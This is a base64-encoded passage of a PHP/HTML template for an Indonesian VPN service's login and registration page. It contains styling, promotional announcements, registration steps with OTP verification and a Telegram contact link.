S10cmFuc2l0aW9uKTsKfQppbnB1dFt0eXBlPXRleHRdLCBpbnB1dFt0eXBlPWVtYWlsXSwgaW5wdXRbdHlwZT1wYXNzd29yZF0sIGlucHV0W3R5cGU9bnVtYmVyXSB7CiAgd2lkdGg6IDEwMCU7IHBhZGRpbmc6IDAuOHJlbSAxcmVtOwogIGJhY2tncm91bmQ6IHJnYmEoMTAsIDIyLCA0MCwgMC42KTsKICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOwogIGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7IGNvbG9yOiB2YXIoLS10ZXh0LXByaW1hcnkpOwogIGZvbnQtc2l6ZTogMC45cmVtOyBmb250LWZhbWlseTogaW5oZXJpdDsgb3V0bGluZTogbm9uZTsKICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKfQppbnB1dDpmb2N1cyB7CiAgYm9yZGVyLWNvbG9yOiB2YXIoLS1hY2NlbnQpOwogIGJveC1zaGFkb3c6IDAgMCAwIDNweCByZ2JhKDU5LCAxMzAsIDI0NiwgMC4xKSwKICAgICAgICAgICAgICBpbnNldCAwIDFweCAwIHJnYmEoNTksIDEzMCwgMjQ2LCAwLjA1KTsKfQppbnB1dDo6cGxhY2Vob2xkZXIgeyBjb2xvcjogIzMzNDE1NTsgfQppbnB1dDpob3Zlcjpub3QoOmZvY3VzKSB7IGJvcmRlci1jb2xvcjogcmdiYSgzMCwgNTgsIDk1LCAwLjcpOyB9CgovKiBCdXR0b25zICovCi5idG4gewogIHdpZHRoOiAxMDAlOyBwYWRkaW5nOiAwLjg1cmVtOyBib3JkZXI6IG5vbmU7IGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7CiAgZm9udC1zaXplOiAwLjlyZW07IGZvbnQtd2VpZ2h0OiA3MDA7IGN1cnNvcjogcG9pbnRlcjsKICBmb250LWZhbWlseTogaW5oZXJpdDsgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7CiAgbWFyZ2luLXRvcDogMC41cmVtOyBsZXR0ZXItc3BhY2luZzogMC4wM2VtOwogIHBvc2l0aW9uOiByZWxhdGl2ZTsgb3ZlcmZsb3c6IGhpZGRlbjsKfQouYnRuOjphZnRlciB7CiAgY29udGVudDogJyc7IHBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDA7CiAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgdHJhbnNwYXJlbnQgMzAlLCByZ2JhKDI1NSwyNTUsMjU1LDAuMDgpIDYwJSwgdHJhbnNwYXJlbnQgNzAlKTsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTEwMCUpOyB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC42czsKfQouYnRuOmhvdmVyOjphZnRlciB7IHRyYW5zZm9ybTogdHJhbnNsYXRlWCgxMDAlKTsgfQouYnRuLXByaW1hcnkgewogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsIHZhcigtLWFjY2VudCksIHZhcigtLWFjY2VudDIpKTsKICBjb2xvcjogI2ZmZjsKICBib3gtc2hhZG93OiAwIDRweCAyNHB4IHJnYmEoMzcsIDk5LCAyMzUsIDAuMyk7Cn0KLmJ0bi1wcmltYXJ5OmhvdmVyIHsKICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTJweCk7CiAgYm94LXNoYWRvdzogMCA4cHggMzJweCByZ2JhKDM3LCA5OSwgMjM1LCAwLjQ1KTsKfQouYnRuLXByaW1hcnk6YWN0aXZlIHsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDApOyB9Ci5idG4tc2Vjb25kYXJ5IHsKICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsKICBjb2xvcjogdmFyKC0tdGV4dC1zZWNvbmRhcnkpOyBtYXJnaW4tdG9wOiAwLjVyZW07Cn0KLmJ0bi1zZWNvbmRhcnk6aG92ZXIgewogIGJvcmRlci1jb2xvcjogdmFyKC0tYWNjZW50KTsgY29sb3I6ICM2MGE1ZmE7CiAgYmFja2dyb3VuZDogcmdiYSgzMCwgNTgsIDk1LCAwLjIpOwp9CgovKiBBbGVydHMgKi8KLmFsZXJ0IHsKICBwYWRkaW5nOiAwLjg1cmVtIDFyZW07IGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7CiAgZm9udC1zaXplOiAwLjg0cmVtOyBtYXJnaW4tYm90dG9tOiAxcmVtOwogIGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBmbGV4LXN0YXJ0OyBnYXA6IDAuNnJlbTsKICBhbmltYXRpb246IGZhZGVTbGlkZUluIDAuM3MgZWFzZTsKfQouYWxlcnQtZXJyb3IgewogIGJhY2tncm91bmQ6IHJnYmEoMTI3LCAyOSwgMjksIDAuMTUpOyBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDEyNywgMjksIDI5LCAwLjQpOwogIGNvbG9yOiAjZmNhNWE1Owp9Ci5hbGVydC1zdWNjZXNzIHsKICBiYWNrZ3JvdW5kOiByZ2JhKDYsIDc4LCA1OSwgMC4xNSk7IGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoNiwgOTUsIDcwLCAwLjQpOwogIGNvbG9yOiAjNmVlN2I3Owp9Ci5hbGVydC1pY29uIHsgZmxleC1zaHJpbms6IDA7IG1hcmdpbi10b3A6IDFweDsgfQoKLyogRGl2aWRlciAqLwouZGl2aWRlciB7CiAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiAwLjc1cmVtOwogIG1hcmdpbjogMXJlbSAwOyBjb2xvcjogIzMzNDE1NTsgZm9udC1zaXplOiAwLjc4cmVtOwp9Ci5kaXZpZGVyOjpiZWZvcmUsIC5kaXZpZGVyOjphZnRlciB7CiAgY29udGVudDogJyc7IGZsZXg6IDE7IGJvcmRlci10b3A6IDFweCBzb2xpZCAjMWUyOTNiOwp9CgovKiBPVFAgSW5wdXQgKi8KLm90cC1ub3RlIHsKICBjb2xvcjogdmFyKC0tdGV4dC1zZWNvbmRhcnkpOyBmb250LXNpemU6IDAuODVyZW07CiAgbWFyZ2luLWJvdHRvbTogMS4yNXJlbTsgbGluZS1oZWlnaHQ6IDEuNTsKfQoKCi8qIEluZm8gY2FyZHMgKi8KLmluZm8tY2FyZCB7CiAgYmFja2dyb3VuZDogcmdiYSgxNSwgMjMsIDQyLCAwLjUpOwogIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICBtYXJnaW4tYm90dG9tOiAxcmVtOwogIG92ZXJmbG93OiBoaWRkZW47CiAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7Cn0KLmluZm8tY2FyZDpob3ZlciB7CiAgYm9yZGVyLWNvbG9yOiB2YXIoLS1ib3JkZXItYWNjZW50KTsKfQouaW5mby1jYXJkLWhlYWRlciB7CiAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiAwLjVyZW07CiAgcGFkZGluZzogMC43NXJlbSAxcmVtOwogIGZvbnQtc2l6ZTogMC44MnJlbTsgZm9udC13ZWlnaHQ6IDcwMDsgY29sb3I6IHZhcigtLXRleHQtcHJpbWFyeSk7CiAgYmFja2dyb3VuZDogcmdiYSgzMCwgNTgsIDk1LCAwLjIpOwogIGJvcmRlci1ib3R0b206IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOwp9Ci5pbmZvLWNhcmQtaGVhZGVyIHN2ZyB7IGZsZXgtc2hyaW5rOiAwOyBjb2xvcjogdmFyKC0tYWNjZW50KTsgfQouaW5mby1jYXJkLWJvZHkgeyBwYWRkaW5nOiAwLjc1cmVtIDFyZW07IH0KCi8qIFByb21vIGl0ZW1zICovCi5wcm9tby1pdGVtIHsKICBkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogZmxleC1zdGFydDsgZ2FwOiAwLjVyZW07CiAgcGFkZGluZzogMC41cmVtIDA7IGJvcmRlci1ib3R0b206IDFweCBzb2xpZCByZ2JhKDMwLCA1OCwgOTUsIDAuMik7Cn0KLnByb21vLWl0ZW06bGFzdC1jaGlsZCB7IGJvcmRlci1ib3R0b206IG5vbmU7IH0KLnByb21vLWl0ZW0gcCB7CiAgZm9udC1zaXplOiAwLjc4cmVtOyBjb2xvcjogdmFyKC0tdGV4dC1zZWNvbmRhcnkpOwogIGxpbmUtaGVpZ2h0OiAxLjU7IG1hcmdpbjogMDsKfQoucHJvbW8tYmFkZ2UgewogIGZsZXgtc2hyaW5rOiAwOyBmb250LXNpemU6IDAuNnJlbTsgZm9udC13ZWlnaHQ6IDcwMDsKICBwYWRkaW5nOiAwLjE1cmVtIDAuNHJlbTsgYm9yZGVyLXJhZGl1czogNHB4OwogIHRleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7IGxldHRlci1zcGFjaW5nOiAwLjA1ZW07CiAgbWFyZ2luLXRvcDogMnB4Owp9Ci5wcm9tby1iYWRnZSB7IGJhY2tncm91bmQ6IHJnYmEoNTksIDEzMCwgMjQ2LCAwLjIpOyBjb2xvcjogIzYwYTVmYTsgfQoucHJvbW8tYmFkZ2UuZGlzY291bnQgeyBiYWNrZ3JvdW5kOiByZ2JhKDE2LCAxODUsIDEyOSwgMC4yKTsgY29sb3I6ICMzNGQzOTk7IH0KLnByb21vLWJhZGdlLmluZm8geyBiYWNrZ3JvdW5kOiByZ2JhKDEzOSwgOTIsIDI0NiwgMC4yKTsgY29sb3I6ICNhNzhiZmE7IH0KCi8qIFN0ZXAgbGlzdCAqLwouc3RlcC1saXN0IHsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgZ2FwOiAwLjZyZW07IH0KLnN0ZXAtaXRlbSB7CiAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGZsZXgtc3RhcnQ7IGdhcDogMC43cmVtOwp9Ci5zdGVwLW51bSB7CiAgd2lkdGg6IDI2cHg7IGhlaWdodDogMjZweDsgbWluLXdpZHRoOiAyNnB4OwogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsIHZhcigtLWFjY2VudCksIHZhcigtLWFjY2VudDIpKTsKICBjb2xvcjogI2ZmZjsgYm9yZGVyLXJhZGl1czogNTAlOyBmb250LXNpemU6IDAuNzVyZW07IGZvbnQtd2VpZ2h0OiA3MDA7CiAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7Cn0KLnN0ZXAtdGV4dCBzdHJvbmcgewogIGRpc3BsYXk6IGJsb2NrOyBmb250LXNpemU6IDAuNzhyZW07IGNvbG9yOiB2YXIoLS10ZXh0LXByaW1hcnkpOwogIG1hcmdpbi1ib3R0b206IDFweDsKfQouc3RlcC10ZXh0IHNwYW4gewogIGZvbnQtc2l6ZTogMC43cmVtOyBjb2xvcjogdmFyKC0tdGV4dC1tdXRlZCk7Cn0KCi8qIENvbnRhY3QgKi8KLmNvbnRhY3QtbGluayB7CiAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiAwLjZyZW07CiAgcGFkZGluZzogMC41NXJlbSAwLjVyZW07IHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICBmb250LXNpemU6IDAuOHJlbTsgY29sb3I6IHZhcigtLXRleHQtc2Vjb25kYXJ5KTsKICBib3JkZXItcmFkaXVzOiA2cHg7IHRyYW5zaXRpb246IHZhcigtLXRyYW5zaXRpb24pOwp9Ci5jb250YWN0LWxpbms6aG92ZXIgewogIGJhY2tncm91bmQ6IHJnYmEoMzAsIDU4LCA5NSwgMC4zKTsgY29sb3I6IHZhcigtLXRleHQtcHJpbWFyeSk7Cn0KLmNvbnRhY3QtbGluayBzdmcgeyBmbGV4LXNocmluazogMDsgb3BhY2l0eTogMC43OyB9CgovKiBMZWZ0IGZvb3RlciAqLwoubGVmdC1mb290ZXIgewogIG1hcmdpbi10b3A6IDFyZW07IHBhZGRpbmc6IDAuN3JlbSAwLjhyZW07CiAgYmFja2dyb3VuZDogcmdiYSgxNSwgMjMsIDQyLCAwLjMpOyBib3JkZXItcmFkaXVzOiA4cHg7CiAgYm9yZGVyOiAxcHggZGFzaGVkIHZhcigtLWJvcmRlcik7Cn0KLmxlZnQtZm9vdGVyIHAgewogIGZvbnQtc2l6ZTogMC43MnJlbTsgY29sb3I6IHZhcigtLXRleHQtbXV0ZWQpOyBsaW5lLWhlaWdodDogMS41OyBtYXJnaW46IDA7Cn0KCi8qIExvZ28gaWNvbiB3cmFwICovCi5sb2dvLWljb24td3JhcCB7CiAgd2lkdGg6IDU2cHg7IGhlaWdodDogNTZweDsKICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCB2YXIoLS1hY2NlbnQpLCB2YXIoLS1hY2NlbnQyKSk7CiAgYm9yZGVyLXJhZGl1czogMTRweDsgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgbWFyZ2luLWJvdHRvbTogMXJlbTsKICBib3gtc2hhZG93OiAwIDhweCAzMnB4IHJnYmEoMzcsIDk5LCAyMzUsIDAuMzUpOwp9Ci5sb2dvLXNlY3Rpb24gaDEgewogIGZvbnQtc2l6ZTogMnJlbTsgZm9udC13ZWlnaHQ6IDgwMDsgbGV0dGVyLXNwYWNpbmc6IC0wLjAyZW07CiAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgI2YxZjVmOSwgIzYwYTVmYSk7CiAgLXdlYmtpdC1iYWNrZ3JvdW5kLWNsaXA6IHRleHQ7IC13ZWJraXQtdGV4dC1maWxsLWNvbG9yOiB0cmFuc3BhcmVudDsKICBiYWNrZ3JvdW5kLWNsaXA6IHRleHQ7CiAgbWFyZ2luLWJvdHRvbTogMC4zcmVtOwp9Ci5sb2dvLXNlY3Rpb24gLnRhZ2xpbmUgewogIGZvbnQtc2l6ZTogMC44NXJlbTsgY29sb3I6IHZhcigtLXRleHQtc2Vjb25kYXJ5KTsgZm9udC13ZWlnaHQ6IDUwMDsKfQoKLyogUmVzcG9uc2l2ZSAqLwpAbWVkaWEgKG1heC13aWR0aDogOTAwcHgpIHsKICAubGVmdC1wYW5lbCB7IGRpc3BsYXk6IG5vbmU7IH0KICAucmlnaHQtcGFuZWwgeyBmbGV4OiAxOyBwYWRkaW5nOiAxLjVyZW07IH0KICAuYXV0aC1jYXJkIHsgcGFkZGluZzogMS43NXJlbTsgfQp9CkBtZWRpYSAobWluLXdpZHRoOiA5MDFweCkgYW5kIChtYXgtd2lkdGg6IDExMDBweCkgewogIC5sZWZ0LXBhbmVsIHsgcGFkZGluZzogMS41cmVtOyB9Cn0KCi8qIFJlc3BvbnNpdmUgKi8KQG1lZGlhIChtYXgtd2lkdGg6IDkwMHB4KSB7CiAgLmxlZnQtcGFuZWwgeyBkaXNwbGF5OiBub25lOyB9CiAgLnJpZ2h0LXBhbmVsIHsgZmxleDogMTsgcGFkZGluZzogMS41cmVtOyB9CiAgLmF1dGgtY2FyZCB7IHBhZGRpbmc6IDEuNzVyZW07IH0KfQoKCkBtZWRpYSAocHJlZmVycy1yZWR1Y2VkLW1vdGlvbjogcmVkdWNlKSB7CiAgKiwgKjo6YmVmb3JlLCAqOjphZnRlciB7CiAgICBhbmltYXRpb24tZHVyYXRpb246IDAuMDFtcyAhaW1wb3J0YW50OwogICAgYW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDogMSAhaW1wb3J0YW50OwogICAgdHJhbnNpdGlvbi1kdXJhdGlvbjogMC4wMW1zICFpbXBvcnRhbnQ7CiAgfQp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+Cgo8IS0tIE1haW4gTGF5b3V0IC0tPgo8ZGl2IGNsYXNzPSJtYWluLWxheW91dCI+CgogIDwhLS0gTEVGVCBQQU5FTCAtLT4KICAgIDwhLS0gTEVGVCBQQU5FTCAtIEZ1bmN0aW9uYWwgSW5mbyAtLT4KICA8ZGl2IGNsYXNzPSJsZWZ0LXBhbmVsIj4KICAgIDxkaXYgY2xhc3M9ImxlZnQtY29udGVudCI+CgogICAgICA8ZGl2IGNsYXNzPSJsb2dvLXNlY3Rpb24iPgogICAgICAgIDxkaXYgY2xhc3M9ImxvZ28taWNvbi13cmFwIj4KICAgICAgICAgIDxzdmcgd2lkdGg9IjM2IiBoZWlnaHQ9IjM2IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMjJzOC00IDgtMTBWNWwtOC0zLTggM3Y3YzAgNiA4IDEwIDggMTB6Ii8+PC9zdmc+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGgxPjw/PSRhcHBOYW1lPz48L2gxPgogICAgICAgIDxwIGNsYXNzPSJ0YWdsaW5lIj5QcmVtaXVtIFZQTiBTZXJ2aWNlIEluZG9uZXNpYTwvcD4KICAgICAgPC9kaXY+CgogICAgICA8IS0tIEFubm91bmNlbWVudCAvIFByb21vIC0tPgogICAgICA8ZGl2IGNsYXNzPSJpbmZvLWNhcmQgcHJvbW8tY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iaW5mby1jYXJkLWhlYWRlciI+CiAgICAgICAgICA8c3ZnIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIj48cGF0aCBkPSJNMTggOEE2IDYgMCAwIDAgNiA4YzAgNy0zIDktMyA5aDE4cy0zLTItMy05Ii8+PHBhdGggZD0iTTEzLjczIDIxYTIgMiAwIDAgMS0zLjQ2IDAiLz48L3N2Zz4KICAgICAgICAgIDxzcGFuPlBlbmd1bXVtYW4gJiBQcm9tbzwvc3Bhbj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbmZvLWNhcmQtYm9keSI+Cjw/cGhwCiRhbm5vdW5jZW1lbnRzID0gW107CmZvciAoJGkgPSAxOyAkaSA8PSAzOyAkaSsrKSB7CiAgICAkYSA9IGdldFNldHRpbmcoJ2Fubm91bmNlXycuJGksICcnKTsKICAgIGlmICghZW1wdHkoJGEpICYmIHN0cnBvcygkYSwgJ3wnKSAhPT0gZmFsc2UpIHsKICAgICAgICBsaXN0KCRiYWRnZSwgJHRleHQpID0gZXhwbG9kZSgnfCcsICRhLCAyKTsKICAgICAgICBpZiAodHJpbSgkdGV4dCkgIT09ICcnKSB7CiAgICAgICAgICAgICRhbm5vdW5jZW1lbnRzW10gPSBbJ2JhZGdlJyA9PiB0cmltKCRiYWRnZSksICd0ZXh0JyA9PiB0cmltKCR0ZXh0KV07CiAgICAgICAgfQogICAgfQp9CmlmIChlbXB0eSgkYW5ub3VuY2VtZW50cykpIHsKICAgIC8vIEZhbGxiYWNrIGRlZmF1bHRzIGlmIG5vIGFubm91bmNlbWVudHMgc2V0CiAgICAkYW5ub3VuY2VtZW50cyA9IFsKICAgICAgICBbJ2JhZGdlJyA9PiAnQkFSVScsICd0ZXh0JyA9PiAnRnJlZSB0cmlhbCAzIGhhcmkgdW50dWsgc2VtdWEgdXNlciBiYXJ1ISBCdWF0IGFrdW4gc2VrYXJhbmcgZGFuIG5pa21hdGkgYWtzZXMgcGVudWguJ10sCiAgICAgICAgWydiYWRnZScgPT4gJ1BST01PJywgJ3RleHQnID0+ICdEaXNrb24gMjUlIHBha2V0IGJ1bGFuYW4g4oCUIGhhbnlhIFJwIDkuMDAwL2J1bGFuLiBCZXJsYWt1IGhpbmdnYSBha2hpciBidWxhbi4nXSwKICAgICAgICBbJ2JhZGdlJyA9PiAnSU5GTycsICd0ZXh0JyA9PiAnU2VydmVyIGJhcnU6IFNpbmdhcG9yZSAxMEdicHMsIEphcGFuIFRva3lvLCBkYW4gTmV0aGVybGFuZHMgQW1zdGVyZGFtLiddCiAgICBdOwp9CiRiYWRnZUNsYXNzID0gWydCQVJVJyA9PiAnJywgJ1BST01PJyA9PiAnZGlzY291bnQnLCAnSU5GTycgPT4gJ2luZm8nXTsKZm9yZWFjaCAoJGFubm91bmNlbWVudHMgYXMgJGEpOgogICAgJGNscyA9ICRiYWRnZUNsYXNzWyRhWydiYWRnZSddXSA/PyAnJzsKPz4KICAgICAgICAgIDxkaXYgY2xhc3M9InByb21vLWl0ZW0iPgogICAgICAgICAgICA8c3BhbiBjbGFzcz0icHJvbW8tYmFkZ2U8Pz0gJGNscyA/ICcgJy4kY2xzIDogJycgPz4iPjw/PSBodG1sc3BlY2lhbGNoYXJzKCRhWydiYWRnZSddKSA/Pjwvc3Bhbj4KICAgICAgICAgICAgPHA+PD89IGh0bWxzcGVjaWFsY2hhcnMoJGFbJ3RleHQnXSkgPz48L3A+CiAgICAgICAgICA8L2Rpdj4KPD9waHAgZW5kZm9yZWFjaDsgPz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CgogICAgICA8IS0tIENhcmEgRGFmdGFyIC0tPgogICAgICA8ZGl2IGNsYXNzPSJpbmZvLWNhcmQgZ3VpZGUtY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iaW5mby1jYXJkLWhlYWRlciI+CiAgICAgICAgICA8c3ZnIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxsaW5lIHgxPSIxMiIgeTE9IjE3IiB4Mj0iMTIuMDEiIHkyPSIxNyIvPjwvc3ZnPgogICAgICAgICAgPHNwYW4+Q2FyYSBNZW5kYWZ0YXI8L3NwYW4+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iaW5mby1jYXJkLWJvZHkiPgogICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1saXN0Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1pdGVtIj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bSI+MTwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtdGV4dCI+CiAgICAgICAgICAgICAgICA8c3Ryb25nPktsaWsgdGFiIERhZnRhcjwvc3Ryb25nPgogICAgICAgICAgICAgICAgPHNwYW4+ZGkgZm9ybSBzZWJlbGFoIGthbmFuPC9zcGFuPgogICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1pdGVtIj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bSI+MjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtdGV4dCI+CiAgICAgICAgICAgICAgICA8c3Ryb25nPklzaSB1c2VybmFtZSAmIGVtYWlsPC9zdHJvbmc+CiAgICAgICAgICAgICAgICA8c3Bhbj5wYXN0aWthbiBlbWFpbCBha3RpZjwvc3Bhbj4KICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtaXRlbSI+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1udW0iPjM8L2Rpdj4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLXRleHQiPgogICAgICAgICAgICAgICAgPHN0cm9uZz5CdWF0IHBhc3N3b3JkPC9zdHJvbmc+CiAgICAgICAgICAgICAgICA8c3Bhbj5taW5pbWFsIDYga2FyYWt0ZXI8L3NwYW4+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0iPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtbnVtIj40PC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC10ZXh0Ij4KICAgICAgICAgICAgICAgIDxzdHJvbmc+VmVyaWZpa2FzaSBPVFA8L3N0cm9uZz4KICAgICAgICAgICAgICAgIDxzcGFuPmNlayBrb2RlIGRpIGVtYWlsIGthbXU8L3NwYW4+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLWl0ZW0iPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtbnVtIj41PC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC10ZXh0Ij4KICAgICAgICAgICAgICAgIDxzdHJvbmc+TG9naW4gJiBPcmRlciBWUE48L3N0cm9uZz4KICAgICAgICAgICAgICAgIDxzcGFuPnBpbGloIHBha2V0LCBiYXlhciwgbGFuZ3N1bmcgYWt0aWY8L3NwYW4+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgoKICAgICAgPCEtLSBLb250YWsgQWRtaW4gLS0+CiAgICAgIDxkaXYgY2xhc3M9ImluZm8tY2FyZCBjb250YWN0LWNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9ImluZm8tY2FyZC1oZWFkZXIiPgogICAgICAgICAgPHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIHN0cm9rZS13aWR0aD0iMiI+PHBhdGggZD0iTTIxIDE1YTIgMiAwIDAgMS0yIDJIN2wtNCA0VjVhMiAyIDAgMCAxIDItMmgxNGEyIDIgMCAwIDEgMiAyeiIvPjwvc3ZnPgogICAgICAgICAgPHNwYW4+S29udGFrIEFkbWluPC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImluZm8tY2FyZC1ib2R5Ij4KICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vdC5tZS88Pz0gdXJsZW5jb2RlKHN0cl9yZXBsYWNlKCdAJywnJywgZ2V0U2V0dGluZygnY29udGFjdF90ZycsICdvcmRlcnZwbl9hZG1pbicpKSkgPz4iIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIiBjbGFzcz0iY29udGFjdC1saW5rIj4KICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iY3VycmVudENvbG9yIj48cGF0aCBkPSJNMTIgMEM1LjM3MyAwIDAgNS4zNzMgMCAxMnM1LjM3MyAxMiAxMiAxMiAxMi01LjM3MyAxMi0xMlMxOC42MjcgMCAxMiAwem01LjU2MiA4LjE2MWMtLjE4LjcxNy0uOTYyIDQuMDg0LTEuMzYyIDUuNDM2LS4xNjguNTkyLS4zNDQuNzg3LS41NTguODA4LS40NzUuMDQzLS44MzgtLjMxNC0xLjI5Ni0uNjE2LS43Mi0uNDcyLTEuMTI4LS43NjYtMS44MjgtMS4yMjctLjgwOS0uNTMzLS4yODUtMS4wMjEuMTc4LTEuNTczLjEyLS4xNDQgMi4yMDctMi4wMjQgMi4yNDctMi4xOTYuMDQtLjE3Mi4wMzQtLjQzNC0uMTYtLjU1MS0uMTk0LS4xMTctLjQ4LS4wNjQtLjY4Ny4wMzYtLjE3LjA4NS0yLjg3IDEuODI0LTMuMjMgMi4wNC0uMzQuMjA0LS41OC4zMDUtLjgzLjMwNi0uMjczLjAwMi0uODAzLS4xNTUtMS4xOTYtLjI4My0uNDgyLS4xNTctLjg2NC0uMjQtLjgzLS41MDYuMDItLjE0LjE4Ni0uMjgxLjUxNC0uNDI4LjU5OC0uMjY4IDMuMDE1LTEuMjg1IDMuMTY0LTEuMzUzLjU2LS4yNTUgMS4yNC0uMDk0Ljg5Ni40NDctLjA4My4xMzQtLjQ4Mi44NS0uOTYgMS41MTctLjUyNC43MzItLjk1OCAxLjMxOC0uOTU4IDEuNDUzIDAgLjA1OC4xMi4yMS4zNDYuMzUzLjM0LjIxMi41NzguMzI3LjgzNy4zMy4zLjAwNC41OS0uMDk3LjkzLS4zNS4xNjgtLjEyNyAyLjk5LTEuOTg1IDMuMTY4LTIuMTA1LjE4LS4xMi4zNS0uMTguNDktLjEyLjE0LjA2LjE5LjE4LjE1LjI5eiIvPjwvc3ZnPgogICAgICAgICAgICA8c3Bhbj5UZWxlZ3JhbTogPD89IGh0bWxzcGVjaWFsY2hhcnMoZ2V0U2V0dGluZygnY29udGFjdF90Zycs